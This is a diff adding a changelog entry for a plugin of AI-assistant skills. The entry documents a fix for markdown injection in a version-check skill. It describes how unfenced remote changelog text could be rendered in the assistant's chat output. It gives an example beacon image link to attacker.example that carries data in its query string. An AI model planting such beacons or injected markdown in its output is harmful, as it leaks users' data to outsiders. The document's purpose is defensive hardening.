@@ -6,6 +6,14 @@ Entries are reverse-chronological (newest first) and reference the merging PR + 
 
 ---
 
+## v0.80.22
+
+Closes an Eva vuln-scan finding (skills#657): `version/SKILL.md` rendered remote `CHANGELOG.md` content verbatim with no excerpt containment.
+
+- **Gap closed** — `/ievo:version` Step 4 fetches `CHANGELOG.md` unauthenticated from `raw.githubusercontent.com/ievo-ai/skills/main`, and Step 5 splices each selected `## vX.Y.Z` section body directly into the assistant's own printed chat output. Every other skill in this module that touches externally-sourced text (`inspect/SKILL.md`, `feedback/SKILL.md`, `security-check/SKILL.md`, `evo/SKILL.md`, `overlay-status/SKILL.md`, `deep-review/SKILL.md`, `review-retrospective/SKILL.md`, `vuln-scan/SKILL.md`) carries a dedicated excerpt-containment/fencing note before that text reaches a live-Markdown-rendering surface — `version/SKILL.md` had none. An attacker who lands a crafted `![beacon](https://attacker.example/x.png?d=<data>)`/`[label](url)` into a merged (even briefly reverted) `CHANGELOG.md` entry, or into an unsanitized auto-generated entry quoting untrusted PR text, gets it rendered live the instant any user behind latest runs `/ievo:version` — a routine, frequently-invoked, ostensibly read-only command.
+- **Fix** — added a "Fence containment" note under Step 4 (mirroring `feedback/SKILL.md` Step 3.85's note for its own attached-log content): before interpolating a selected changelog section body into the Step 5 render template, scan it for the longest run of consecutive backticks it contains and fence the whole body in a code block using a backtick run one character longer (minimum 3, plain triple backtick when none is found). Updated all three Step 5 render templates (project/local scope, user scope, non-CLI surface) to show the fenced form instead of the bare `<verbatim changelog body for vX.Y.Z>` placeholder, and added a matching Rules bullet clarifying that "verbatim" means unedited text inside the fence, not unfenced.
+- **Version** — `fix:` → patch per AGENTS.md's bump table (security hardening, no new capability). `discover.mjs`, `evolution_candidates.mjs`, and `scrub.mjs` `SCRIPT_VERSION`, `plugin.json`, `marketplace.json`, and the AGENTS.md compliance ledger updated in lockstep (0.80.21 → 0.80.22). `scan_repo.mjs`'s own `SCRIPT_VERSION` stays untouched — it is the intentionally decoupled scanner-output-format version (v0.6.6/#47).
+
 ## v0.80.21
 
 Closes an Eva vuln-scan finding (skills#650): scan_repo.mjs's CLI error-echo sinks interpolated raw newline-carrying values, enabling GitHub Actions workflow-command forgery.
